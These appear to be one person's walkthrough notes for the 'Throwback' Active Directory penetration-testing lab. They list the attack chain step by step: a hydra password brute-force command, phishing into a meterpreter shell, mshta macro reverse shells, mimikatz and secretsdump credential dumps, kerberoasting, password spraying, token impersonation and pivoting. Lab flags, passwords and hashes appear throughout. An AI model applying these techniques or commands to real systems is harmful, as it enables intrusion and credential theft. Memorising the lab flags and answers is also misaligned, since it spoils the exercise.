### Throwback Network ###

flag on guest inbox: TBH{ede543c628d365ab772078b0f6880677}
flag in guest contacts page: TBH{ede543c628d365ab772078b0f6880677}
root flag on THROWBACK-FW01:

------------------------------------------------------------

Enumeration:

port 80 running IIS
Throwback-prod list of employees:
summers winters
jeff davies
hugh gongo
rikka foxx

Contact details:
Great Britain
Phone: +00 151515
Email: hello@TBHSecurity.com

-----------------------------------------------------------

Throwback-mail:
10.200.77.232
running squirrel mail
tbhguest:WelcomeTBH1!

using hydra, we got these credential hits:
hydra -L usernames.txt -P passwords.txt  10.200.77.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v

-----------------------------------------------------------
[80][http-post-form] host: 10.200.77.232   login: JeffersD   password: Summer2020
[STATUS] 53.17 tries/min, 638 tries in 00:12h, 562 to do in 00:11h, 16 active
[STATUS] 51.65 tries/min, 878 tries in 00:17h, 322 to do in 00:07h, 16 active
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: HumphreyW   password: securitycenter
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: PeanutbutterM   password: Summer2020
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: DaviesJ   password: Management2018
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: GongoH   password: Summer2020
[VERBOSE] Page redirected to http://10.200.77.232/src/webmail.php
[80][http-post-form] host: 10.200.77.232   login: MurphyF   password: Summer2020
[STATUS] attack finished for 10.200.77.232 (waiting for children to complete tests)

-----------------------------------------------------------

Logging in with 'DaviesJ' we found a 'shell.exe' file.
Logging in with 'MurphyF' we found:

http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD

-----------------------------------------------------------
throwback-fw01:
in default config
admin:pfsense

/var/log/login.log
# cat /var/log/login.log
Last Login 8/9/2020 15:51 -- HumphreyW:1c13639dba96c7b53d26f7d00956a364


flag.txt: TBH{c9cf8b688a9b8677a4546781527e4484}
root flag: TBH{b6f17a9c06e75ea4a09b79e8d89f9749}

-----------------------------------------------------------

with the phishing email composed and sent, we catch 

meterpreter > getuid
Server username: THROWBACK-WS01\BlaireJ
meterpreter > 

user flag: TBH{9c5e361a2368723e042924180be7c958}
root flag: TBH{9c5e361a2368723e042924180be7c958}

-----------------------------------------------------------
using hashcat to crack our hashes

1c13639dba96c7b53d26f7d00956a364

cracked hash: securitycenter

PetersJ::THROWBACK:83d3e94160875c54:45C7B67ECB07DEE5C1E1C6214E448FB7:0101000000000000C0653150DE09D2017B430EFECF9FE1B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000002000003A036FA605C83CEAF5BEA2891C0417E9E11BC5316FDB3194C736D953EDE18CB00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00320032002E0035000000000000000000

cracked hash: 
Throwback317

-----------------------------------------------------------

THROWBACK-PROD:
ssh PetersJ@10.200.77.219
with password Throwback317

Flag from the poisoned user:
TBH{277c5929d176569338ce0cff02f328c0}

with starkiller we harvest the credential store and find:

We find blairej's flag: TBH{9b56df4dc5cbda864a246ebfe49646c}

and the root flag:TBH{4d6945c0b80283b875fc7c3a5a057da6}

also found admin-petersj:password
SinonFTW123!

using mimikatz to dump passwords, we get blairej's login

BlaireJ cleartext: 7eQgx6YzxgG3vC45t5k9
NTLM hash: c374ecb7c2ccac1df3a82bce4f80bb5b

Administrators NTLM hash: a06e58d15a2585235d18598788b8147a

-----------------------------------------------------------

with meterpreter "arp_scanner" we find a bunch of internal IPs:

'''

[*] ARP Scanning 10.200.77.0/24
[+]     IP: 10.200.77.1 MAC 02:57:54:c1:c0:13 (UNKNOWN)
[+]     IP: 10.200.77.79 MAC 02:86:b2:56:00:95 (UNKNOWN)
[+]     IP: 10.200.77.117 MAC 02:57:4f:e7:a6:e1 (UNKNOWN)
[+]     IP: 10.200.77.118 MAC 02:f7:8b:8d:86:31 (UNKNOWN)
[+]     IP: 10.200.77.138 MAC 02:05:fa:5a:df:33 (UNKNOWN)
[+]     IP: 10.200.77.176 MAC 02:2d:fc:9d:06:99 (UNKNOWN)
[+]     IP: 10.200.77.219 MAC 02:42:ba:01:b3:21 (UNKNOWN)
[+]     IP: 10.200.77.222 MAC 02:67:01:72:73:97 (UNKNOWN)
[+]     IP: 10.200.77.232 MAC 02:db:4e:ae:af:87 (UNKNOWN)
[+]     IP: 10.200.77.243 MAC 02:da:dd:7d:c8:ef (UNKNOWN)
[+]     IP: 10.200.77.250 MAC 02:b7:03:8e:60:b9 (UNKNOWN)
[+]     IP: 10.200.77.255 MAC 02:42:ba:01:b3:21 (UNKNOWN)

-----------------------------------------------------------

we use bloodhound to extract the loot.zip folder and graph out the network

service account that is kerberoastable: sqlservice
what domain does the trust connect to: corporate.local
What normal user account is a domain admin: MercerH

in bloodhound we win MercerH's flag: TBH{b89d9a1648b62a7f2ed01038ac47796b}

moving onto impacket use on the the sql server .117

we use BlaireJ's credentials to  get a valid kerbroastable ticket

kerbroasted sqlservice account: mysql337570

-----------------------------------------------------------
Using proxychains we connect to THROWBACK-TIME and login
with MurphyF's account: Password

and find the first flag on THROWBACK-TIME

TBH{326e71e82d2cfc439ee513340b8d9222}

-----------------------------------------------------------
Generating our macro for THROWBACK-TIME, we create the timesheet.xlsm macro
and use msfconsole to generate the mshta payload and get a reverse shell
with a meterpreter shell we migrate to a system with winlogon.exe and dump our hashes

Administrator:500:aad3b435b51404eeaad3b435b51404ee:43d73c6a52e8626eabc5eb77148dca0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
peanut:1010:aad3b435b51404eeaad3b435b51404ee:7c3e7c054e11b7f79a5d3e6e35fa0248:::
sshd:1008:aad3b435b51404eeaad3b435b51404ee:6eea75cd2cc4ddf2967d5ee05792f9fb:::
Timekeeper:1009:aad3b435b51404eeaad3b435b51404ee:901682b1433fdf0b04ef42b13e343486:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::

then crackstation timekeepers hash and get:
Timekeeper's password: keeperoftime

-----------------------------------------------------------
using proxychains we are able to ssh into THROWBACK-TIME with Timekeepers creds
we dump the sql db with the sqlservice account and pw
and find a flag within the sql db: TBH{ac3f61048236fd398da9e2289622157e}
we also find the administrator flag under C:\Administrator: TBH{2898c692926188884bf508efe560588f}

-----------------------------------------------------------
with the new usernames and passwords we can use crackmapexec to password spray the domain
'''
we find JeffersD:Throwback2020 
'''
with crackmapexec
then we ssh onto THROWBACK-DC01 with JeffersD username and pw
On the DC we login and find the user flag under MercerH's description:
'''
TBH{e6119f456f5107d655be3682559f720f}
'''

-----------------------------------------------------------
On the DC we find the backup_notice.txt advising of the backup account

'''
backup_notice.txt:
As we backup the servers all staff are to use the backup account for replicating the servers
Don't user your domain accounts on the backup servers.

The credentials for the backup are:
'''
backup:TBH_Backup2348!
'''

Best Regards,
Hans Mercer
Throwback Hacks Security System Administrator

-----------------------------------------------------------
login to the dc with backup works and we use secretsdump.py from impacket
we get the dumped credentials from dcsync abuse
exported to
'''
secrets_dump.txt
'''
we find MercerH's password and use hashcat to crack it with OneRuleToRuleThemAll.rules rules file
'''
MercerH:pikapikachu7
'''

------------------------------------------------------------
ssh into the DC as mercer and find the root flag
'''
TBH{1b9b614a505017c6fa34cb188581db65}
'''
upload .\met shell to the DC and get a revershell and setup proxychains for the Corporate domain

using proxychains and evil-winrm we get access to the CORP-DC01
we find the user flag under MercerH\desktop:
'''
TBH{773e16d57284363e68a4db254860aed1}
'''
we find the root flag in Admin\desktop:
'''
TBH{d2368a76214103ac670a7984b4dba5a3}
'''

------------------------------------------------------------
We then find the server_update.txt which redirects us to the

twitter flag:TBH{ca57861454b195f6a5c951a634e05f9e}

we also find the linkedin flag here: TBH{2913c22315f3ce3c873a14e4862dd717}

------------------------------------------------------------
now we proxychains into .243 with DaviesJ
and load incognito mode with a meterpreter shell after popping met.exe again
with incognito we can impersonate tokens on the DC and user
CORPORATE\DosierK
from here we get the root flag: TBH{7defa0d5b36c72a48e5966fd2493e19e}

we also find the user flag: TBH{250fd11eadbd01e7ed14196611d7b255}

from DosierK we check the documents folder and find email_update.txt
this shows us the remaining details we need YAHOOOO

------------------------------------------------------------
Using LeetLinked we pull usersnames and emails from throwback hacks on linkedin
using namely we create a new wordlist that we can input into breach | gtfo
with breach | gtfo we input the emails and find:
'''
SEC-JStewart@TBHSEcurity.com
aqAwM53cW8AgRbfr
JStewart
pwnDB
'''
from here we add mail.corporate.local to our hosts for 10.200.77.232
and login with his email/pw
and find the User:Pass in his email > jstewart_email.txt
The user flag for BoJack too: TBH{19b6ca4281bbef3ee060aaf1c2eb4021}

we then go check the source code of breach|gtfo and find the flag:
'''
TBH{53f3a6cb77f633edd9749926b9a9217b}

------------------------------------------------------------
proxychain into TBSEC-01 with TBSEC_GUEST:WelcomeTBSEC1!

and get the user flag: TBH{3efabe3366172f3f97d1123f2cc6dfb5}

and find the root flag: TBH{ec08be8aa9113b47f321b5032a27b220}

with meterpreter we will migrate our shell to winlogon.exe pid=708

Now using startkiller we load mshta and get an agent onto TBSEC-01

and start running rubeus with powershell/credentials/rubeus
and start kerbroasting accounts and get new hashes:

tbservice_hash.txt

now we can use hashcat to crack the hash

which gives us:securityadmin284650

WAHOOOOO!!!



